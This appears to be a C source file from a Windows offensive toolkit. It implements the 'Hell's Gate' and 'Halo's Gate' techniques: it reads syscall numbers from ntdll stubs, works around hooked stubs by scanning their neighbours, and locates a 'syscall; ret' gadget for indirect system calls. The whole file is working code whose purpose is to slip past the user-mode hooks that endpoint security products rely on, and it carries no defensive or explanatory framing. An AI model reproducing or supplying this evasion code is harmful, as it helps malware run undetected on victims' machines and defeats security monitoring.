#include "syscall_gate.h"
#include <stdio.h>

#define UP   -1
#define DOWN  1

// Hell's Gate: stub is clean, read SSN directly from bytes 4-5
static BOOL HellsGate(PBYTE stub, WORD* ssn) {
    if (stub[0] == 0x4C &&
        stub[1] == 0x8B &&
        stub[2] == 0xD1 &&
        stub[3] == 0xB8 &&
        stub[6] == 0x00 &&
        stub[7] == 0x00)
    {
        *ssn = *(WORD*)(stub + 4);
        return TRUE;
    }
    return FALSE;
}

// Halo's Gate: stub is hooked, scan neighboring stubs (each 32 bytes apart)
// direction: UP (-1) or DOWN (+1)
// adjust SSN by number of steps taken
static BOOL HalosGate(PBYTE stub, int direction, WORD* ssn) {
    for (int i = 1; i <= 32; i++) {
        PBYTE neighbor = stub + (direction * i * 0x20);

        if (neighbor[0] == 0x4C &&
            neighbor[1] == 0x8B &&
            neighbor[2] == 0xD1 &&
            neighbor[3] == 0xB8 &&
            neighbor[6] == 0x00 &&
            neighbor[7] == 0x00)
        {
            WORD neighborSSN = *(WORD*)(neighbor + 4);
            *ssn = (WORD)(neighborSSN - (direction * i));
            return TRUE;
        }
    }
    return FALSE;
}

// Walk ntdll bytes looking for "syscall; ret" gadget (0F 05 C3)
static PVOID FindSyscallGadget(void) {
    PBYTE base = (PBYTE)GetModuleHandleA("ntdll.dll");
    if (!base) return NULL;

    for (DWORD i = 0; i < 0x200000 - 2; i++) {
        if (base[i]   == 0x0F &&
            base[i+1] == 0x05 &&
            base[i+2] == 0xC3)
        {
            return (PVOID)(base + i);
        }
    }
    return NULL;
}

// Resolve CC struct for a named Nt* function
// tries Hell's Gate first, falls back to Halo's Gate if stub is hooked
BOOL ResolveCC(const char* funcName, CC* out) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    PBYTE stub = (PBYTE)GetProcAddress(ntdll, funcName);
    if (!stub) return FALSE;

    WORD ssn    = 0;
    BOOL resolved = FALSE;

    // try Hell's Gate: clean stub
    if (HellsGate(stub, &ssn)) {
        resolved = TRUE;
    }
    // try Halo's Gate scanning upward
    else if (HalosGate(stub, UP, &ssn)) {
        resolved = TRUE;
    }
    // try Halo's Gate scanning downward
    else if (HalosGate(stub, DOWN, &ssn)) {
        resolved = TRUE;
    }

    if (!resolved) return FALSE;

    PVOID gadget = FindSyscallGadget();
    if (!gadget) return FALSE;

    out->ssn    = ssn;
    out->pad[0] = out->pad[1] = out->pad[2] = 0;
    out->pad[3] = out->pad[4] = out->pad[5] = 0;
    out->gad    = gadget;
    return TRUE;
}
